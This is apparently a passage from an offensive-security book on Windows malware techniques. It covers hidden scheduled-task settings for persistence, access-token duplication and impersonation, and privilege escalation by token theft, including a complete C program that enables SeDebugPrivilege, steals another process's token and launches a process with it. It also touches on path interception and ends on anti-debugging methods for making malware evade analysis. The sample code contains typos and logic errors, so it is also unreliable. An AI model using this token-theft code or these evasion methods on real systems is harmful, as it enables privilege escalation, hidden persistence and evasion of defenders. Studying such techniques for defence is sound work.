</ul>
</li>
<li>
<p><code>ITaskSettings</code>: A component of the Windows Task Scheduler API used to define the operational behavior, constraints, and execution environment of a scheduled task. It is used to control how the Task Scheduler service manages and executes the task, rather than when or what. It allows for fine-tuning the task's execution policy. It defines methods for configuring execution limits and controls, power and role conditions, visibility and priority, and wake-up behavior.</p>
<ul>
<li>
<p><code>put_ExecutionTimeLimit</code>: A property setter in the Task Scheduler API used to defie the maximum amount of time a scheduled task is allowed to run before the Task Scheduler service forcibly terminates the task's process.</p>
<ul>
<li>The format (<a href="https://www.iso.org/iso-8601-date-and-time-format.html">ISO 8601</a>) starts with <code>P</code> (for Period) followed by one or more time components:
<ul>
<li><code>Y</code> (Years) -&gt; i.e., <code>P2Y</code> is a period of 2 years.</li>
<li>M (Months)</li>
<li>W (Weeks)</li>
<li>D (Days)</li>
<li>T (Time Separator required before hours/minutes/seconds)</li>
<li>H (Hours)</li>
<li>M (Minutes)</li>
<li>S (Seconds)</li>
</ul>
</li>
<li>Passing an empty string <code>L""</code> or <code>0</code> implies no time limit.</li>
</ul>
<pre><code class="language-C">HRESULT ITaskSettings::put_ExecutionTimeLimit(
  [in] BSTR timeLimit
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>put_ExecutionTimeLimit</code> method's parameters:</p>
<ul>
<li><code>timeLimit</code>: A BSTR containing the execution time limit in the ISO 8601 duration format (i.e., <code>P2M2WT2H</code> for 2 months, 2 weeks, and 2 hours).</li>
</ul>
</li>
<li>
<p>The <code>put_ExecutionTimeLimit</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the time limit was successfully set on the <code>ITaskSettings</code> object.</p>
</li>
</ul>
</li>
<li>
<p><code>put_AllowDemandStart</code>: A property setter in the Task Scheduler API used to control whether a scheduled task can be manually started outside of its defined triggers. Setting <code>allowDemandStart</code> to <code>FALSE</code> is used in security-sensitive or high-availability environments to ensure that tasks only run under specific controlled conditions and are not accidentally or maliciously executed by unauthorized processes on demand.</p>
<pre><code class="language-C">HRESULT ITaskSettings::put_AllowDemandStart(
  [in] VARIANT_BOOL allowDemandStart
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>put_AllowDemandStart</code> method's parameters:
<ul>
<li><code>allowDemandStart</code>: A boolean value that specifies whether manual execution is allowed. The value should be set to <code>VARIANT_TRUE</code> or <code>VARIANT_FALSE</code>.</li>
</ul>
</li>
<li>The <code>put_AllowDemandStart</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</li>
</ul>
</li>
<li>
<p><code>put_StartWhenAvailable</code>: A property setter in the Task Scheduler API that defines the task's behavior if its scheduled start time is missed. Used to instruct the Task Scheduler to run the task even if its initial trigger has passed, provided the trigger condition is no longer valid.</p>
<pre><code class="language-C">HRESULT ITaskSettings::put_StartWhenAvailable(
  [in] VARIANT_BOOL startWhenAvailable
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>put_StartWhenAvailable</code> method's parameters:
<ul>
<li><code>startWhenAvailable</code>: A boolean value that specifies whether the Task SCheduler should start the task when conditions allow, even if the scheduled time was missed. Should be set to <code>VARIANT_TRUE</code> or <code>VARIANT_FALSE</code>.</li>
</ul>
</li>
<li>The <code>put_StartWhenAvailable</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</li>
</ul>
</li>
<li>
<p><code>put_Enabled</code>: A property setter in the Task Scheduler API used to activate or deactivate a scheduled task without deleting it. Useful for temporary suspension of a task, maintenance, or for setting up a task in a disabled state until all conditions are ready for execution.</p>
<pre><code class="language-C">HRESULT ITaskSettings::put_Enabled(
  [in] VARIANT_BOOL enabled
);
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>put_Enabled</code> method's parameters:</p>
<ul>
<li><code>enabled</code>: A boolean value that specifies the task's status. Set to <code>VARIANT_TRUE</code> to enable the task or <code>VARIANT_FALSE</code> to disable it.</li>
</ul>
</li>
<li>
<p>The <code>put_Enabled</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</p>
</li>
<li>
<p><code>put_Hidden</code>: A property setter in the Task Schedule API used to control the visibility of the scheduled task within the Windows Task Sheduler Management Console (GUI). Determines whether a task will be displayed to the user in the standard Task Scheduler interface (<code>taskschd.msc</code>).</p>
<pre><code class="language-C">HRESULT ITaskSettings::put_Hidden(
  [in] VARIANT_BOOL hidden
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>put_Hidden</code> method's parameters:
<ul>
<li><code>hidden</code>: A boolean value that specifies the visibility of the task. Set to <code>VARIANT_TRUE</code> to hide the task or <code>VARIANT_FALSE</code> to make it visible.</li>
</ul>
</li>
<li>The <code>put_Hidden</code> method returns an <code>HRESULT</code> value. <code>S_OK</code> indicates the setting was successfully applied to the <code>ITaskSettings</code> object.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>ASEP</strong>s: Auto-Start Extensibility Points</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="privilege-esaclation-techniques-with-malware"><a class="header" href="#privilege-esaclation-techniques-with-malware">Privilege Esaclation Techniques with Malware</a></h1>
<p>At this point, you should be familiar with what a principal is, and how their access rights determine what actions they can take on a system, network, or domain. When a hacker initially compromises a target system, they may not have the level of privilege necessary to execute on their intent. Privilege escalation descibes the tactics and techniques used to gain higher rights on a system, network, or domain after the initial compromise.</p>
<h2 id="access-tokens-1"><a class="header" href="#access-tokens-1">Access Tokens</a></h2>
<p><strong>Access Tokens</strong> are a core element of the authentication process on Windows, created and managed by the <strong>Local Security Authority Subsystem Service</strong> (LSASS). They are responsible for identifying and describing the security context of a process or thread running on a system. Every time a user authenticates successfully, an access token is generated by <code>winlogon.exe</code>, by way of <code>lsass.exe</code>.</p>
<p>It includes the identity and privileges of the user account associated with the thread or process. Then, it is attached to the <code>userinit.exe</code> process, after which all child processes started by the user will inherit a copy of the access token and run under the privileges of the same access token.</p>
<p><img src="img/access_token_auth.png" alt="image" /></p>
<blockquote>
<p>Diagram of Access Token Generation After Authentication</p>
</blockquote>
<p>Windows developers can engage with the access token that represents their current login session in the <code>LSASS</code> process using different Win32 APIs. For instance, <code>DuplicateTokenEx</code> can be used to copy pre-existing tokens:</p>
<ul>
<li>
<p><code>DuplicateTokenEx</code>: A Windows API function that creates a new access token that duplicates an existing one. It can be found in <code>advapi32.dll</code>.</p>
<ul>
<li>The <code>Ex</code> variant allows you to:
<ul>
<li>Change the token type (i.e., <code>ImpersonationToken</code> -&gt; <code>Primary Token</code>), which is required to launch a new process via the <code>CreateProcessAsUser</code> function.</li>
<li>Define exactly what the new handle is allowed to do.</li>
<li>Set impersonation levels.</li>
</ul>
</li>
</ul>
<pre><code class="language-C">BOOL DuplicateTokenEx(
  [in] HANDLE hExistingToken,
  [in] DWORD dwDesiredAccess,
  [in, optional] LPSECURITY_ATTRIBUTES lpTokenAttributes,
  [in] SECURITY_IMPERSONATION_LEVEL ImpersonationLeve,
  [in] TOKEN_TYPE TokenType,
  [out] PHANDLE phNewToken
)
</code></pre>
<p>Here is a breakdown of the <code>DuplicateTokenEx</code> function's parameters:</p>
<ul>
<li>
<p><code>hExistingToken</code>: A handle to the original token, which must have been opened with <code>TOKEN_DUPLICATE</code> acess.</p>
</li>
<li>
<p><code>dwDesiredAccess</code>: Determines what actions can be performed using the handle to the new token. The values you can pass fall into three categories:</p>
<ul>
<li><strong>Specific Rights</strong>: The most common values used when you need to perform specific operations on a token.
<ul>
<li><code>TOKEN_DUPLICATE</code> (0x0002): Required to duplicate the token (often passed if you plan to clone this new token later).</li>
<li><code>TOKEN_QUERY</code> (0x0008): Required to query the token (i.e., getting the User SID or Group List)</li>
<li><code>TOKEN_ASSIGN_PRIMARY</code> (0x0001): Required to attach the new token to a process (used with <code>CreateProcessAsUser</code>).</li>
<li><code>TOKEN_IMPERSONATE</code> (0x0004): Required to attach the token to a thread for impersonation.</li>
<li><code>TOKEN_ADJUST_PRIVILEGES</code> (0x0020): Required to enable or disable privileges within the token.</li>
<li><code>TOKEN_ADJUST_DEFAULT</code> (0x0080): Required to change the default DACL or primary group of the token.</li>
</ul>
</li>
<li><strong>Standard Rights</strong>: A set of security permissions that apply to almost all type of <strong>Executive Objects</strong> (i.e., processes, thread, registry keys, and synchronization objects), governing the management of the object itself rather than the data it contains.
<ul>
<li><code>DELETE</code> (0x00010000): The right to delete the object.</li>
<li><code>READ_CONTROL</code> (0x00020000): The right to read the information in the object's security descriptor (the DACL), but not the SACL, which requires the special <code>ACCESS_SYSTEM_SECURITY</code> right.</li>
<li><code>WRITE_DAC</code> (0x00040000): The right to change who has access to the object by modifying the Discretionary Access Control List (DACL) in the security descriptor.</li>
<li><code>WRITE_OWNER</code> (0x00080000): The right to change the owner of the object in the security descriptor.</li>
</ul>
</li>
<li><strong>Generic Rights</strong>: Common bundles of standalone access rights that are utilized as opposed to combining each right manually using the OR (<code>|</code>) operator.
<ul>
<li><code>TOKEN_ALL_ACCESS</code>: Combines all possible specific and standard rights for a token, essentially creating a God-mode handle for that specific token.</li>
<li><code>TOKEN_READ</code>: Combines <code>STANDARD_RIGHTS_READ</code> and <code>TOKEN_QUERY</code>.</li>
<li><code>TOKEN_WRITE</code>: Combines <code>STANDARD_RIGHTS_WRITE</code>, <code>TOKEN_ADJUST_PRIVILEGES</code>, <code>TOKEN_ADJUST_GROUPS</code>, and <code>TOKEN_ADJUST_DEFAULT</code>.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>lpTokenAttributes</code>: A pointer to a <code>SECURITY_ATTRIBUTES</code> structure, that determines if the new handle can be inherited by child processes. Usually <code>NULL</code>.</p>
<ul>
<li><code>SECURITY_ATTRIBUTES</code>: a structure used in Windows programming, primarily when creating a new object (a file, process, thread, or even an access token) to define its security descriptor and its inheritance properties.</li>
</ul>
<p>Here is a breakdown of the structure's attributes:</p>
<pre><code class="language-C">typedef struct _SECURITY_ATTRIBUTES{
  DWORD nLength;
  LPVOID lpSecurityDescriptor;
  BOOL bInheritHandle;
}SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
</code></pre>
<p>Where:</p>
<ul>
<li><code>nLength</code>: The size of the structure in bytes. Should be equal to <code>sizeof(SECURITY_ATTRIBUTES)</code> before passing it to a function.</li>
<li><code>lpSecurityDescriptor</code>: A pointer to a <code>SECURITY_DESCRIPTOR</code> structure, which defines who owns the object and who has permission to use it.</li>
<li><code>bInheritHandle</code>: A boolean flag that determines if child processes can inherit the handle being created (<code>TRUE</code> for yes).</li>
</ul>
</li>
<li>
<p><code>ImpersonationLevel</code>: A critical setting that determines how much authority a server or profess has when it acts on behalf of another user. There are four levels defined in the <code>SECURITY_IMPERSONATION_LEVEL</code> enumeration:</p>
<ul>
<li><code>SecurityAnonymous</code>: Server can identify that a connection is being made, but cannot see any identifying information about the client.</li>
<li><code>SecurityIdentification</code>: The server can retrieve your <strong>Security Identifier</strong> (SID) and privileges to perform its own access checks, however it cannot access local resources using your identity.</li>
<li><code>SecurityImpersonation</code>: The serverr can access local resources as if it were the user, however it is limited to the local machine.</li>
<li><code>SecurityDelegate</code>: Allows the server to impersonate the user's security context on both local and remote systems.</li>
</ul>
</li>
<li>
<p><code>TokenType</code>: Tells the kernel what the intended function of the access token is (whether it is attached to a Process or a Thread). It can have one of two possible values:</p>
<ul>
<li><code>TokenPrimary</code>: An access token that is attached to a process, which defines the security context of the process including:
<ul>
<li>The <strong>User SID</strong></li>
<li>The <strong>Group SIDs</strong></li>
<li><strong>Privileges</strong> (i.e., <code>SeDebugPrivilege</code>, <code>SeShutdownPrivilege</code>, etc.)</li>
<li><strong>MIC Integrity Level</strong></li>
<li>The Default <strong>DACL</strong></li>
</ul>
</li>
</ul>
<div id="admonition-note" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-title">
<div class="admonition-title">
<div id="admonition-note-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Escalation.html#admonition-note"></a>
</div>
<div>
<p>If you intend to create a new access token to create a new process (i.e., using <code>CreateProcessAsUser</code>, <code>CreateProcessWithTokenW</code>, etc.) you must duplicate the existing token as a <code>TokenPrimary</code></p>
</div>
</div>
<ul>
<li><code>TokenImpersonation</code>: An access token used by a thread to take actions on a system on behalf of a user. If your program must temporarily act as a different user, it must be a <code>TokenImpersonation</code> type.</li>
</ul>
</li>
<li>
<p><code>phNewToken</code>: A pointer to the variable that receives the handle for the newly created clone token.</p>
</li>
</ul>
<p><code>DuplicateTokenEx</code> returns <code>TRUE</code> on success, <code>FALSE</code> on failue (i.e., <code>ERROR_ACCESS_DENIED</code>).</p>
</li>
</ul>
<p>There are a lot of reasons to duplicate a token. For instance, we may need our program to impersonate a user in order to temporarily act on their behalf. After duplicating the token, we would use the <code>ImpersonateLoggedOnUser</code> function to switch the security context of the thread to the selected user. This reverts back after the <code>RevertToSelf</code> function is called, the thread exits, or the token is otherwise revoked:</p>
<ul>
<li>
<p><code>ImpersonateLoggedOnUser</code>: A Win32 API that causes the calling thread to impersonate the security context contained in a token handle.</p>
<pre><code class="language-C">BOOL ImpersonateLoggedOnUser(
  [in] HANDLE hToken
);
</code></pre>
<p>Here is a breakdown of the <code>ImpersonateLoggedOnUser</code> function's parameters:</p>
<ul>
<li><code>hToken</code>: A handle to a primary or impersonation access token. The handle must have <code>TOKEN_QUERY</code> and <code>TOKEN_DUPLICATE </code> access rights.</li>
</ul>
<p><code>ImpersonateLoggedOnUser</code> returns <code>TRUE</code> on success and <code>FALSE</code> upon failure.</p>
</li>
</ul>
<p>A <strong>Locally Unique Identifier</strong> (LUID), is a 64-bit hexadecimal value used to identify locally unique entities on a system, such login sessions. Every access token must contain an <strong>Authentication ID</strong> (AuthID) parameter, which is used to identify the associated login session by utilizing the LUID. LUIDs can also be used to locally identify privileges on the system. The rights of a user account dictate what system actions can be performed by said account. The rights of a user encompass both the individual entitlements assigned to the user and the permissions granted to members of the group. These permissions are assigned by administrators and can be distringuished on the system by their assigned LUIDs. However, LUIDs are not exactly human-readable, so before you can perform any modifications to privileges, you must convert their human-readable names to their LUIDs using <code>LookupPrivilegeValue</code>:</p>
<pre><code class="language-C">BOOL LookupPrivilegeValueA(
  [in, optional] LPCSTR lpSystemName,
  [in] LPCSTR lpName,
  [out] PLUID lpLuid
);
</code></pre>
<p>Here is a breakdown of the <code>LookupPrivilegeValueA</code> function's parameters:</p>
<ul>
<li><code>lpSystemName</code>: A pointer to a string that specifies the name of the system where the privilege is being looked up. Passing <code>NULL</code> looks up the value on the local system.</li>
<li><code>lpName</code>: The null-terminated string of the privilege name (i.e., <code>SeDebugPrivilege</code>).</li>
<li><code>lpLuid</code>: A pointer to the <code>LUID</code> structure that will receive the translated 64-bit value.</li>
</ul>
<p><code>LookupPrivilegeValueA</code> returns <code>TRUE</code> on success, <code>FALSE</code> on failue (i.e., <code>ERROR_NO_SUCH_PRIVILEGE</code>).</p>
<p>Access tokens and privileges play a vital role in certain privilege escalation techniques. Knowing how to access and query these values is fundamentally important to crafting the perfect attack.</p>
<h2 id="token-theft"><a class="header" href="#token-theft">Token Theft</a></h2>
<p>Token theft is a technique where an attacker steals an existing access token from a running process and uses it to assume the identity and privileges of that user. It typically follows this sequence of steps:</p>
<ol>
<li><strong>Gain Access</strong>: Attacker must first have administrative of <code>SeDebugPrivilege</code> rights on the system to interact with other processes.</li>
<li><strong>Open the Source</strong>: Attacker identifies a high-privileged process (i.e., <code>winlogon.exe</code>) and calls <code>OpenProcess</code>.</li>
<li><strong>Extract the Token</strong>: Attacker calls <code>OpenProcessToken</code> to get a handle to that process' primary token.</li>
<li><strong>Duplicaet</strong>: Since they cannot use the original handle directly, they call <code>DuplicateTokenEx</code> to create a copy of it.</li>
<li><strong>Impersonate or Launch</strong>: The attacker either:</li>
</ol>
<ul>
<li>Creates an <code>Impersonation</code> token to act on behalf of the victim within their current process</li>
<li>Creates a <code>Primary</code> token to launch a new process on behalf of the victim, typically a new command shell with higher privileges.</li>
</ul>
<div id="admonition-note-1" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-1-title">
<div class="admonition-title">
<div id="admonition-note-1-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Escalation.html#admonition-note-1"></a>
</div>
<div>
<p>Modern protection methods, such as <strong>Protected Process Light</strong> (PPL) and credential guard should be activated on a system to mitigate token theft.</p>
</div>
</div>
<p><img src="img/token_theft_seq.png" alt="image" /></p>
<blockquote>
<p>Diagram of the Token Theft Process</p>
</blockquote>
<p>For instance, in <code>C</code>, this can be implemented as follows:</p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;iostream&gt;

BOOL setPrivilege(LPCTSTR priv){
  HANDLE token;
  TOKEN_PRIVILEGES token_privs;
  LUID luid;
  BOOL resp = TRUE;

  if (!LookupPrivilegeValue(NULL, priv, &amp;luid)) resp = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;token)) resp = FALSE;

  token_privs.PrivilegeCount = 1;
  token_privs.Privileges[0].LUID = luid;
  token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLE;

  if (!AdjustTokenPrivileges(token, FALSE, &amp;token_privs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) resp = FALSE;

  CloseHandle(token);
  return resp;
}

HANDLE getToken (DWORD pid){
  HANDLE cToken = NULL;
  HANDLE ph = NULL;
  if(pid == 0){
    ph = GetCurrentProcess();
  } else {
    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
  }

  if(!ph) cToken = (HANDLE)NULL;
  BOOL resp = OpenProcessToken(ph, MAXIMUM_ALLOWED, &amp;cToken);
  if(resp) cToken = (HANDLE)NULL;

  return cToken;
}

BOOL createProcess(HANDLE token, LPCWSTR app){
  HANDLE dToken = NULL;
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  BOOL resp = TRUE;
  ZeroMemory(&amp;si, sizeof(STARTUPINFOW));
  ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));
  si.cb = sizeof(STARTUPINFOW);

  resp = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokennPrimary, &amp;dToken);
  resp = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFIE, app, NULL, 0, NULL, NULL, &amp;si, &amp;pi);

  return resp;
}

int main (int argc, char** argv){
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  DWORD pid = atoi(argv[1]);
  HANDLE cToken = getToken(pid);
  if(!createProcess(cToken, L"C:\\Windows\\System32\\mspaint.exe")) return -1;
  return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>OpenProcessToken</code>: A vital Win32 API function used to retrieve the access token associated with a specific process. Located in <code>advapi32.dll</code>.</p>
<pre><code class="language-C">BOOL OpenProcessToken(
  [in] HANDLE ProcessHandle,
  [in] DWORD DesiredAccess,
  [out] PHANDLE TokenHandle
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>OpenProcessToken</code> function's parameters:
<ul>
<li><code>ProcessHandle</code>: A handle to the process whose access token you want to retrieve. It must have the <code>PROCESS_QUERY_INFORMATION</code> access right.</li>
<li><code>DesiredAccess</code>: An access mask specifying what you intend to do with the token.
<ul>
<li>See <code>DuplicateTokenEx</code> for value options.</li>
</ul>
</li>
<li><code>TokenHandle</code>: A pointer to a handle that receives the address of the newly opened access token if the function succeeds.</li>
</ul>
</li>
<li>The <code>OpenProcessToken</code> function returns <code>TRUE upon success, </code>FALSE<code>upon failure (i.e.,</code>ERROR_ACCESS_DENIED<code>if the</code>ProcessHandle` doesn't have enough permissions.)</li>
</ul>
</li>
</ul>
<ul>
<li>
<p><code>TOKEN_PRIVILEGES</code>: Used to describe a set of privileges for an access token. Essential when you want to query what privileges a process has or when you use <code>AdjustTokenPrivileges</code> to enable/disable them.</p>
<pre><code class="language-C">typedef struct _TOKEN_PRIVILEGES {
  DWORD PrivilegeCount;
  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;
</code></pre>
<ul>
<li>
<p>Here is a breakdown of the <code>TOKEN_PRIVILEGES</code> structure's attributes:</p>
<ul>
<li><code>PrivilegeCount</code>: Specifies the number of entries in the <code>Privileges</code> array.</li>
<li><code>Privileges[ANYSIZE_ARRAY]</code>: An array of structures representing each individual privilege.</li>
</ul>
<div id="admonition-note-2" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-2-title">
<div class="admonition-title">
<div id="admonition-note-2-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Escalation.html#admonition-note-2"></a>
</div>
<div>
<p>If you need more than one privilege, you must manually allocate enough memory for the extra <code>LUID_AND_ATTRIBTUTES</code> elements:</p>
<pre><code class="language-C">  DWORD bufferSize = sizeof(TOKEN_PRIVILEGES)+(numPrivileges-1)*sizeof(LUID_AND_ATTRIBUTES);
  PTOKEN_PRIVILEGES pTokenPrivs = (PTOKEN_PRIVILEGES)malloc(bufferSize);
  pTokenPrivs.PrivilegeCount = numPrivileges;
</code></pre>
<ul>
<li>Here is a breakdown of the <code>LUID_AND_ATTRIBUTES</code> structure's attributes:
<ul>
<li><code>LUID</code>: The <strong>Locally Unique Identifier</strong> which represents a privilege on the local system (i.e., <code>SeDebugPrivilege</code>). This value is typically obtained by calling the <code>LookupPrivilegeValue</code> function.</li>
<li><code>Attributes</code>: A bitmask that defines the state of the privilege. The most common values include:
<ul>
<li><code>SE_PRIVILEGE_ENABLED</code> (0x00000002): Enables the privilege.</li>
<li><code>SE_PRIVILEGE_ENABLED_BY_DEFAULT</code> (0x00000001): The privilege is enabled by default (not relevant for our purposes here).</li>
<li><code>SE_PRIVILEGE_REMOVED</code> (0x00000004): The privilege is permanently removed from the token.</li>
<li><code>SE_PRIVILEGE_USED_FOR_ACCESS</code> (0x80000000): Privilege was used to gain access to an object.</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</li>
</ul>
</li>
<li>
<p><code>AdjustTokenPrivileges</code>: A Windows API function from the Win32 API, which enables or disables privileges in a specified access token, which represents the security context of a process or thread.</p>
<pre><code class="language-C">BOOL AdjustTokenPrivileges(
  [in] HANDLE TokenHandle,
  [in] BOOL DisableAllPrivileges,
  [in] PTOKEN_PRIVILEGES NewState,
  [in] DWORD BufferLength,
  [in, optional] PTOKEN_PRIVILEGES PreviousState,
  [in, optional] PDWORD ReturnLength
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>AdjustTokenPrivileges</code> function's attributes:
<ul>
<li><code>TokenHandle</code>: The handle to the token you want to modify. It must have been opened with <code>TOKEN_ADJUST_PRIVILEGES</code> access.</li>
<li><code>DisableAllPrivileges</code>: Causes the function to disable all privileges and ignore the <code>NewState</code> parameter.</li>
<li><code>NewState</code>: A pointer to a <code>TOKEN_PRIVILEGES</code> structure, containing the <code>LUID</code>'s and the <code>SE_PRIVILEGE_ENABLED</code> attributes you want to set.</li>
<li><code>BufferLength</code>: The size, in bytes, or the <code>PreviousState</code> buffer. If <code>PreviousState</code> is <code>NULL</code>, this is <code>0</code>.</li>
<li><code>PreviousState</code>: A pointer to a buffer that receives the original state of any privileges the function modifies, allowing you to undo changes later.</li>
<li><code>ReturnLength</code>: A pointer to a variable that receives the required size of the <code>PreviousState</code> buffer.</li>
</ul>
</li>
<li><code>AdjustTokenPrivileges</code> can return <code>TRUE</code> even if it failed to adjust all privileges you requirested. Fo instance, if you try to enable <code>SedebugPrivilege</code> but you account doesn't actually possess that privilege in its token, the function returns <code>TRUE</code> because the function call completed, but the action failed.</li>
</ul>
<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
<div class="admonition-title">
<div id="admonition-note-3-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Escalation.html#admonition-note-3"></a>
</div>
<div>
<p>To verify success, you must do this:</p>
<ol>
<li>Check if the return value is <code>TRUE</code></li>
<li>Immediately call <code>GetLastError()</code></li>
<li>If <code>GetLastError() == ERROR_NOT_ALL_ASSIGNED</code>, then at least one priivlege failed to enable.</li>
</ol>
</div>
</div>
</li>
</ul>
<ul>
<li>
<p><code>CreateProcessWithTokenW</code>: A powerful Win32 API which creates a new process and its primary thread in the security context of a specific user token. It is frequently used by services or administrative tools (i.e., <code>runas</code>) to launch a process as a different user. Asks the <code>Secondary Logon Service</code> to do the work for you. It's different from <code>CreateProcessAsUser</code>, as the function does not require the caller to have the <code>SeAssignePrimaryTokenPrivilege</code>, which is very restricted. Unlike other functions, it only exists in a <code>W</code> variant. <code>CreateProcessWithTokenW</code> can be found in <code>advapi32.dll</code>.</p>
<pre><code class="language-C">BOOL CreateProcessWithTokenW(
  HANDLE hToken,
  DWORD dwLogonFlags,
  LPCWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCWSTR lpCurrentDirectory,
  LPSTARTUPINFOW lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
</code></pre>
<ul>
<li>Here is a breakdown of the function's parameters:
<ul>
<li><code>hToken</code>: A handle to the primary token for the new process. This is usually obtained via <code>LogonUser</code> or <code>DuplicateTokenEx</code>.</li>
<li><code>dwLogonFlags</code> (0x00000001): Specifies the logon options regarding the user's profile for the new thread.
<ul>
<li><code>LOGON_WITH_PROFILE</code>: Loads the user profile (HKU, user environment) for the new process. Useful when the process needs the user reistry hive or profile resources.</li>
<li><code>LOGON_NETCREDENTIALS_ONLY</code> (0x00000002): Uses the token's credentials for outbound network authentication, but does not load the user profile. Local access uses the caller's account.</li>
<li><code>None</code> (0x00000000): The default setting. Does not load the profile. Standard token behavior.</li>
</ul>
</li>
<li><code>lpApplicationName</code>: The path to the executable. Can be <code>NULL</code> if the path is in the <code>lpCommandLine</code> argument.</li>
<li><code>lpCommandLine</code>: The command line string to execute.</li>
<li><code>dwCreationFlags</code>: Controls how the process is created (i.e., <code>CREATE_SUSPENDED</code>, <code>CREATE_NO_WINDOW</code>)</li>
<li><code>lpEnvironment</code>: A pointer to an environment block. If <code>NULL</code> the new process uses an environment created from the user's token.</li>
<li><code>lpCurrentDirectory</code>: The working directory for the new process.</li>
<li><code>lpStartupInfo</code>: Structure defining window appearance and standard handles (<code>stdin</code>/<code>stdout</code>)</li>
<li><code>lpProcessInformation</code>: Structure that receives the new Process/Thread handles and IDs.</li>
</ul>
</li>
</ul>
<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
<div class="admonition-title">
<div id="admonition-note-4-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Escalation.html#admonition-note-4"></a>
</div>
<div>
<p>There are 3 critical requirements which must be met in order for <code>CreateProcessWithTokenW</code> to work as intended:</p>
<ol>
<li><strong>The Secondary Logon Service</strong>: The service <code>seclogon</code> must be running, otherwise the function will fail with <code>ERROR_SERVICE_DISABLED</code>.</li>
<li><strong>Token Type</strong>: The <code>hToken</code> must be a Priary Token, not an impersonation token</li>
<li><strong>Permissions</strong>: The caller must have the identity of the user they are trying to launch, have the <code>SeDebugPrivilege</code>, or be part of the Administrators group.</li>
</ol>
<ul>
<li>By having the <code>SeDebugPrivilege</code>, the system treats the request to open and duplicate another user's token as a legitimate debugging action.</li>
</ul>
</div>
</div>
<ul>
<li>The <code>CreateProcessWithTokenW</code> function returns <code>TRUE</code> upon success, <code>FALSE</code> upon failure.</li>
</ul>
</li>
</ul>
<h2 id="path-interception"><a class="header" href="#path-interception">Path Interception</a></h2>
<p><strong>Path Interception</strong> is a vulnerability that occurs when an executable can be placed in a location which allows it to highjack the execution path of another, intended application. When the target program is executed with an elevated security context, this can result in privilege escalation. There are 3 variations of this vulnerability that we will review here: The <strong><code>PATH</code> Environment Variable</strong>, <strong>Search Order Highjacking</strong>, and <strong>Unquoted Paths</strong>.</p>
<h3 id="path-environment-variable"><a class="header" href="#path-environment-variable"><a href="https://attack.mitre.org/techniques/T1574/007/">Path Environment Variable</a></a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="malware-detection-evasion-techniques"><a class="header" href="#malware-detection-evasion-techniques">Malware Detection Evasion Techniques</a></h1>
<p>Modern Computer Systems come preloaded with a number of security mechanisms to combat the basic methods of exploitation, privilege escalation, and persistence we have reviewed so far. Without modification, these techniques would immediately be identified and mitigated before the attacker could perform any part of their operation. But although they likely won't work on their own, with some additional consideration these techniques can still be useful for exploiting weaknesses in security systems. In this section, we will review some methods for writing strong malware payloads that avoid detection and circumvent many of the obstacles that would otherwise prevent a payload from ever executing on a secure system.</p>
<h2 id="anti-debugging-tricks"><a class="header" href="#anti-debugging-tricks">Anti-Debugging Tricks</a></h2>
<p>Preventing malware from being analyzed, or at the very least making analysis extremely difficult, ultimately gives it a quality of ambiguity, so that its functions and mechanisms cannot be determined. There are numerous debugging detection techniques, and here we will review a few as well as some methods for identifying new ones. Although a capable analyst will be capaable of mitigating any of them, introducing complexit at least makes their job a lot harder.</p>
<h3 id="detecting-debugger-presence"><a class="header" href="#detecting-debugger-presence">Detecting Debugger Presence</a></h3>
<p>The first step in anti-debugging is determining whether or not the application is being run with a debugger attached. It is possible to ask the operating system using the <code>IsDebuggerPresent</code> function.</p>
<pre><code class="language-C">BOOL WINAPI IsDebuggerPresent(void);
</code></pre>
<ul>
<li>
<p>The <code>IsDebuggerPresent</code> function takes no parameters. It simply checks whether the <code>BeingDebugged</code> flag is set in the <strong>Process Environment Block</strong> (PEB)/</p>
